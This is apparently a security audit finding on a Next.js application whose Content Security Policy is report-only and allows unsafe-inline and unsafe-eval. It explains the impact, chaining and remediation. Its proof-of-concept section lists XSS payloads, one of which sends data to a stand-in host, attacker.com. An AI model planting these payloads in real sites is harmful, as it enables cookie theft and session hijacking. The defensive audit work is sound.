# Finding: Main CSP is Report-Only (Not Enforced)

## Severity
MEDIUM (amplifier for XSS findings)

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N = 0.0 (standalone)
N/A — amplifier finding that increases impact of XSS vulnerabilities

## Affected Code
- **File:** `next.config.mjs:219`
- **Header:** `Content-Security-Policy-Report-Only` (not `Content-Security-Policy`)

## Description
The main Content Security Policy is set via `Content-Security-Policy-Report-Only` rather than `Content-Security-Policy`. This means all CSP directives on the main application pages are advisory only — violations are reported but never blocked.

Combined with the permissive policy that includes `'unsafe-inline'` and `'unsafe-eval'` in `script-src`, XSS attacks against main application pages face minimal CSP-based resistance. Inline scripts, event handlers, and `eval()` are all explicitly allowed by the policy.

## Proof of Concept
The following XSS payload executes without any CSP interference:
```html
<img src=x onerror=alert(document.cookie)>
<script>eval(document.cookie)</script>
<svg/onload=fetch('https://attacker.com/steal')>
```

All three payloads work because:
- `'unsafe-inline'` allows inline event handlers and `<script>` blocks
- `'unsafe-eval'` allows `eval()` calls
- The report-only header means no blocking occurs regardless

## Impact
- XSS payloads face zero CSP blocking on main app pages
- The `'unsafe-inline'` and `'unsafe-eval'` directives mean most XSS payloads execute without modification
- The report-only policy provides visibility into violations but no actual protection
- Combined with F-003 stored XSS, enables an undetectable XSS worm (Chain 11)

## Evidence
```javascript
// next.config.mjs:219
key: "Content-Security-Policy-Report-Only",  // ← NOT enforced
value: `default-src 'self' https: ... script-src 'self' 'unsafe-inline' 'unsafe-eval' https: ...`
```

## Methodology
- **First found by:** Config analysis (00-ai-configs.md C-002)
- **Confirmed by:** Reachability analysis

## Chain Potential
**Amplifier for XSS-based chains.**
- **Chain 11 (CSP Report-Only → Undetectable XSS Worm):** CSP provides zero XSS blocking, and the CSP report endpoint is a no-op (F-016). This enables the stored XSS worm (F-003) to propagate indefinitely without detection. Amplification adder: +$3K-$5K.
- **Chain 8 (Embed Clickjacking):** No CSP blocking in the embed context means the XSS executes freely.

## Remediation
Migrate to an enforced `Content-Security-Policy` header. Remove `'unsafe-inline'` and `'unsafe-eval'` in favor of nonces or hashes. Tighten protocol wildcards (`https:`) to specific domains.
